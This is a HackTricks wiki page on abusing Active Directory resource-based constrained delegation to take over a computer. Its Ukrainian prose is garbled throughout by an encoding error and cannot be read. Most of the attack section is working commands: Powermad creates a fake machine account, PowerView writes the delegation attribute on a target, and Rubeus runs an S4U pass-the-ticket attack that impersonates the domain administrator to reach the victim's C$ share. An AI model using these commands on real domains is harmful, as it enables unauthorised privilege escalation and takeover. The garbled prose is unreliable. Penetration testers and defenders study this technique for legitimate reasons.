# –†–µ—Å—É—Ä—Å–Ω–∞ –æ–±–º–µ–∂–µ–Ω–∞ –¥–µ–ª–µ–≥–∞—Ü—ñ—è

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## –û—Å–Ω–æ–≤–∏ —Ä–µ—Å—É—Ä—Å–Ω–æ—ó –æ–±–º–µ–∂–µ–Ω–æ—ó –¥–µ–ª–µ–≥–∞—Ü—ñ—ó

–¶–µ —Å—Ö–æ–∂–µ –Ω–∞ –±–∞–∑–æ–≤—É [–û–±–º–µ–∂–µ–Ω—É –¥–µ–ª–µ–≥–∞—Ü—ñ—é](constrained-delegation.md), –∞–ª–µ **–∑–∞–º—ñ—Å—Ç—å** –Ω–∞–¥–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª—ñ–≤ **–æ–±'—î–∫—Ç—É –¥–ª—è –≤—Ç—ñ–ª–µ–Ω–Ω—è –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—Ä–æ—Ç–∏ —Å–ª—É–∂–±–∏**. –†–µ—Å—É—Ä—Å–Ω–∞ –æ–±–º–µ–∂–µ–Ω–∞ –¥–µ–ª–µ–≥–∞—Ü—ñ—è **–≤—Å—Ç–∞–Ω–æ–≤–ª—é—î –≤ –æ–±'—î–∫—Ç—ñ, —Ö—Ç–æ –º–æ–∂–µ –≤—Ç—ñ–ª—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—Ä–æ—Ç–∏ –Ω—å–æ–≥–æ**.

–£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –æ–±–º–µ–∂–µ–Ω–∏–π –æ–±'—î–∫—Ç –º–∞—Ç–∏–º–µ –∞—Ç—Ä–∏–±—É—Ç –ø—ñ–¥ –Ω–∞–∑–≤–æ—é _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ –∑ —ñ–º'—è–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π –º–æ–∂–µ –≤—Ç—ñ–ª—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–æ–≥–æ —ñ–Ω—à–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—Ä–æ—Ç–∏ –Ω—å–æ–≥–æ.

–©–µ –æ–¥–Ω–∞ –≤–∞–∂–ª–∏–≤–∞ –≤—ñ–¥–º—ñ–Ω–Ω—ñ—Å—Ç—å —Ü—ñ—î—ó –û–±–º–µ–∂–µ–Ω–æ—ó –¥–µ–ª–µ–≥–∞—Ü—ñ—ó –≤—ñ–¥ —ñ–Ω—à–∏—Ö –¥–µ–ª–µ–≥–∞—Ü—ñ–π –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –±—É–¥—å-—è–∫–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑ **–ø—Ä–∞–≤–∞–º–∏ –∑–∞–ø–∏—Å—É –Ω–∞–¥ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º –º–∞—à–∏–Ω–∏** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/—Ç–æ—â–æ_) –º–æ–∂–µ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (—É —ñ–Ω—à–∏—Ö —Ñ–æ—Ä–º–∞—Ö –¥–µ–ª–µ–≥–∞—Ü—ñ—ó –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ–º–µ–Ω—É).

### –ù–æ–≤—ñ –∫–æ–Ω—Ü–µ–ø—Ü—ñ—ó

–£ –≤–∏–ø–∞–¥–∫—É –û–±–º–µ–∂–µ–Ω–æ—ó –¥–µ–ª–µ–≥–∞—Ü—ñ—ó –±—É–ª–æ —Å–∫–∞–∑–∞–Ω–æ, —â–æ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å **`TrustedToAuthForDelegation`** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è _userAccountControl_ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **S4U2Self**. –ê–ª–µ —Ü–µ –Ω–µ –∑–æ–≤—Å—ñ–º –ø—Ä–∞–≤–¥–∞.\
–ù–∞—Å–ø—Ä–∞–≤–¥—ñ, –Ω–∞–≤—ñ—Ç—å –±–µ–∑ —Ü—å–æ–≥–æ –∑–Ω–∞—á–µ–Ω–Ω—è –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ **S4U2Self** –ø—Ä–æ—Ç–∏ –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫—â–æ –≤–∏ —î **—Å–ª—É–∂–±–æ—é** (–º–∞—î—Ç–µ SPN), –∞–ª–µ —è–∫—â–æ —É –≤–∞—Å **—î `TrustedToAuthForDelegation`**, –ø–æ–≤–µ—Ä–Ω–µ–Ω–∏–π TGS –±—É–¥–µ **Forwardable**, —ñ —è–∫—â–æ —É –≤–∞—Å **–Ω–µ–º–∞—î** —Ü—å–æ–≥–æ –ø—Ä–∞–ø–æ—Ä—Ü—è, –ø–æ–≤–µ—Ä–Ω–µ–Ω–∏–π TGS **–Ω–µ –±—É–¥–µ** **Forwardable**.

–û–¥–Ω–∞–∫, —è–∫—â–æ **TGS**, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –≤ **S4U2Proxy**, **–ù–ï —î Forwardable**, —Å–ø—Ä–æ–±–∞ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è **–±–∞–∑–æ–≤–æ—é –û–±–º–µ–∂–µ–Ω–æ—é –¥–µ–ª–µ–≥–∞—Ü—ñ—î—é** **–Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ**. –ê–ª–µ —è–∫—â–æ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ **—Ä–µ—Å—É—Ä—Å–Ω–æ-–æ–±–º–µ–∂–µ–Ω—É –¥–µ–ª–µ–≥–∞—Ü—ñ—é**, —Ü–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ (—Ü–µ –Ω–µ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, —Ü–µ, –∑–¥–∞—î—Ç—å—Å—è, —Ñ—É–Ω–∫—Ü—ñ—è).

### –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –∞—Ç–∞–∫–∏

> –Ø–∫—â–æ —É –≤–∞—Å —î **–µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω—ñ –ø—Ä–∞–≤–∞ –∑–∞–ø–∏—Å—É** –Ω–∞–¥ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º **–ö–æ–º–ø'—é—Ç–µ—Ä–∞**, –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ **–ø—Ä–∏–≤—ñ–ª–µ–≥–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø** –¥–æ —Ü—ñ—î—ó –º–∞—à–∏–Ω–∏.

–ü—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∂–µ –º–∞—î **–µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω—ñ –ø—Ä–∞–≤–∞ –∑–∞–ø–∏—Å—É –Ω–∞–¥ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º –∂–µ—Ä—Ç–≤–∏**.

1. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ **–∫–æ–º–ø—Ä–æ–º–µ—Ç—É—î** –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å, —è–∫–∏–π –º–∞—î **SPN**, –∞–±–æ **—Å—Ç–≤–æ—Ä—é—î –æ–¥–∏–Ω** ("–°–ª—É–∂–±–∞ A"). –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–±—É–¥—å-—è–∫–∏–π** _–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á_ –±–µ–∑ –±—É–¥—å-—è–∫–∏—Ö —ñ–Ω—à–∏—Ö —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –º–æ–∂–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏** –¥–æ 10 **–æ–±'—î–∫—Ç—ñ–≤ –ö–æ–º–ø'—é—Ç–µ—Ä–∞ (**_**MachineAccountQuota**_**)** —ñ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —ó–º SPN. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø—Ä–æ—Å—Ç–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –æ–±'—î–∫—Ç –ö–æ–º–ø'—é—Ç–µ—Ä–∞ —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ SPN.
2. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ **–∑–ª–æ–≤–∂–∏–≤–ª—é—î —Å–≤–æ—ó–º–∏ –ø—Ä–∞–≤–∞–º–∏ –ó–ê–ü–ò–°–£** –Ω–∞–¥ –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º –∂–µ—Ä—Ç–≤–∏ (–°–ª—É–∂–±–∞B), —â–æ–± –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ **—Ä–µ—Å—É—Ä—Å–Ω–æ-–æ–±–º–µ–∂–µ–Ω—É –¥–µ–ª–µ–≥–∞—Ü—ñ—é –¥–ª—è –¥–æ–∑–≤–æ–ª—É –°–ª—É–∂–±—ñA –≤—Ç—ñ–ª—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –ø—Ä–æ—Ç–∏ —Ü—ñ—î—ó –æ–±–ª—ñ–∫–æ–≤–æ—ó –∑–∞–ø–∏—Å–∏ –∂–µ—Ä—Ç–≤–∏ (–°–ª—É–∂–±–∞B).
3. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î Rubeus –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **–ø–æ–≤–Ω–æ—ó –∞—Ç–∞–∫–∏ S4U** (S4U2Self —Ç–∞ S4U2Proxy) –≤—ñ–¥ –°–ª—É–∂–±–∏ A –¥–æ –°–ª—É–∂–±–∏ B –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **–∑ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–º –¥–æ—Å—Ç—É–ø–æ–º –¥–æ –°–ª—É–∂–±–∏ B**.
1. S4U2Self (–≤—ñ–¥ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, —è–∫–∏–π –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π/—Å—Ç–≤–æ—Ä–µ–Ω–∏–π): –ó–∞–ø–∏—Ç–∞—Ç–∏ **TGS –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–ª—è –º–µ–Ω–µ** (–ù–µ Forwardable).
2. S4U2Proxy: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **–Ω–µ Forwardable TGS** –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ –∫—Ä–æ–∫—É, —â–æ–± –∑–∞–ø–∏—Ç–∞—Ç–∏ **TGS** –≤—ñ–¥ **–ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞** –¥–æ **–∂–µ—Ä—Ç–≤–∏ —Ö–æ—Å—Ç–∞**.
3. –ù–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –Ω–µ Forwardable TGS, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –µ–∫—Å–ø–ª—É–∞—Ç—É—î—Ç–µ —Ä–µ—Å—É—Ä—Å–Ω–æ-–æ–±–º–µ–∂–µ–Ω—É –¥–µ–ª–µ–≥–∞—Ü—ñ—é, —Ü–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ.
4. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ **–ø–µ—Ä–µ–¥–∞—Ç–∏ –∫–≤–∏—Ç–æ–∫** —Ç–∞ **–≤—Ç—ñ–ª–∏—Ç–∏** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ **–¥–æ—Å—Ç—É–ø –¥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∂–µ—Ä—Ç–≤–∏ B**.

–©–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ _**MachineAccountQuota**_ –¥–æ–º–µ–Ω—É, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## –ê—Ç–∞–∫–∞

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ –∫–æ–º–ø'—é—Ç–µ—Ä–∞

–í–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –æ–±'—î–∫—Ç –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥–æ–º–µ–Ω—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–µ–ª–µ–≥—É–≤–∞–Ω–Ω—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–µ—Å—É—Ä—Å—ñ–≤

**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–æ–¥—É–ª—è PowerShell –¥–ª—è –¥—ñ—ó –≤ –∞–∫—Ç–∏–≤–Ω–æ–º—É –∫–∞—Ç–∞–ª–æ–∑—ñ**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### –í–∏–∫–æ–Ω–∞–Ω–Ω—è –ø–æ–≤–Ω–æ–≥–æ –∞—Ç–∞–∫–∏ S4U

–°–ø–æ—á–∞—Ç–∫—É –º–∏ —Å—Ç–≤–æ—Ä–∏–ª–∏ –Ω–æ–≤–∏–π –æ–±'—î–∫—Ç –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –∑ –ø–∞—Ä–æ–ª–µ–º `123456`, —Ç–æ–º—É –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–µ–Ω —Ö–µ—à —Ü—å–æ–≥–æ –ø–∞—Ä–æ–ª—è:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
–¶–µ –≤–∏–≤–µ–¥–µ —Ö–µ—à—ñ RC4 —Ç–∞ AES –¥–ª—è —Ü—å–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É.\
–ó–∞—Ä–∞–∑ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –±—ñ–ª—å—à–µ –∫–≤–∏—Ç–∫—ñ–≤, –ø—Ä–æ—Å—Ç–æ –∑–∞–ø–∏—Ç–∞–≤—à–∏ –æ–¥–∏–Ω —Ä–∞–∑, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä `/altservice` —É Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —î –∞—Ç—Ä–∏–±—É—Ç, —è–∫–∏–π –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è "**–ù–µ –º–æ–∂–µ –±—É—Ç–∏ –¥–µ–ª–µ–≥–æ–≤–∞–Ω–∏–º**". –Ø–∫—â–æ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ü–µ–π –∞—Ç—Ä–∏–±—É—Ç –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ True, –≤–∏ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –≤–∏–¥–∞–∞–≤–∞—Ç–∏ –π–æ–≥–æ. –¶–µ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å –º–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ bloodhound.
{% endhint %}

### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É

–û—Å—Ç–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥–∞ –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞ –≤–∏–∫–æ–Ω–∞—î **–ø–æ–≤–Ω–∏–π –∞—Ç–∞–∫—É S4U —Ç–∞ –≤–ø—Ä–æ–≤–∞–¥–∏—Ç—å TGS** –≤—ñ–¥ –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ —Ü—ñ–ª—å–æ–≤–æ–≥–æ —Ö–æ—Å—Ç–∞ –≤ **–ø–∞–º'—è—Ç—ñ**.\
–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –±—É–ª–æ –∑–∞–ø–∏—Ç–∞–Ω–æ TGS –¥–ª—è —Å–ª—É–∂–±–∏ **CIFS** –≤—ñ–¥ –ê–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞, —Ç–æ–º—É –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **C$**:
```bash
ls \\victim.domain.local\C$
```
### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ä—ñ–∑–Ω–∏–º–∏ —Å–µ—Ä–≤—ñ—Å–Ω–∏–º–∏ –∫–≤–∏—Ç–∫–∞–º–∏

–î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–¥–æ—Å—Ç—É–ø–Ω—ñ —Å–µ—Ä–≤—ñ—Å–Ω—ñ –∫–≤–∏—Ç–∫–∏ —Ç—É—Ç**](silver-ticket.md#available-services).

## –ü–æ–º–∏–ª–∫–∏ Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ Kerberos –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ DES –∞–±–æ RC4, –∞ –≤–∏ –Ω–∞–¥–∞—î—Ç–µ –ª–∏—à–µ —Ö–µ—à RC4. –ü–æ—Å—Ç–∞—á—Ç–µ Rubeus –ø—Ä–∏–Ω–∞–π–º–Ω—ñ —Ö–µ—à AES256 (–∞–±–æ –ø—Ä–æ—Å—Ç–æ –ø–æ—Å—Ç–∞—á—Ç–µ –π–æ–º—É —Ö–µ—à—ñ rc4, aes128 —Ç–∞ aes256). –ü—Ä–∏–∫–ª–∞–¥: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —á–∞—Å –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è –≤—ñ–¥ —á–∞—Å—É DC, —ñ Kerberos –Ω–µ –ø—Ä–∞—Ü—é—î –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º.
* **`preauth_failed`**: –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–∞–¥–∞–Ω–µ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ + —Ö–µ—à—ñ –Ω–µ –ø—Ä–∞—Ü—é—é—Ç—å –¥–ª—è –≤—Ö–æ–¥—É. –ú–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–∞–±—É–ª–∏ –ø–æ—Å—Ç–∞–≤–∏—Ç–∏ "$" –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –ø—Ä–∏ –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —Ö–µ—à—ñ–≤ (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: –¶–µ –º–æ–∂–µ –æ–∑–Ω–∞—á–∞—Ç–∏:
  * –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á, —è–∫–æ–≥–æ –≤–∏ –Ω–∞–º–∞–≥–∞—î—Ç–µ—Å—è —ñ–º—ñ—Ç—É–≤–∞—Ç–∏, –Ω–µ –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ–≥–æ —Å–µ—Ä–≤—ñ—Å—É (—á–µ—Ä–µ–∑ —Ç–µ, —â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –π–æ–≥–æ —ñ–º—ñ—Ç—É–≤–∞—Ç–∏ –∞–±–æ —á–µ—Ä–µ–∑ —Ç–µ, —â–æ —É –Ω—å–æ–≥–æ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤)
  * –ó–∞–ø–∏—Ç–∞–Ω–∏–π —Å–µ—Ä–≤—ñ—Å –Ω–µ —ñ—Å–Ω—É—î (—è–∫—â–æ –≤–∏ –ø—Ä–æ—Å–∏—Ç–µ –∫–≤–∏—Ç–æ–∫ –¥–ª—è winrm, –∞–ª–µ winrm –Ω–µ –ø—Ä–∞—Ü—é—î)
  * –°—Ç–≤–æ—Ä–µ–Ω–∏–π fakecomputer –≤—Ç—Ä–∞—Ç–∏–≤ –ø—Ä–∏–≤—ñ–ª–µ—ó –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤–æ–º—É —Å–µ—Ä–≤–µ—Ä—ñ, —ñ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ —ó—Ö.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
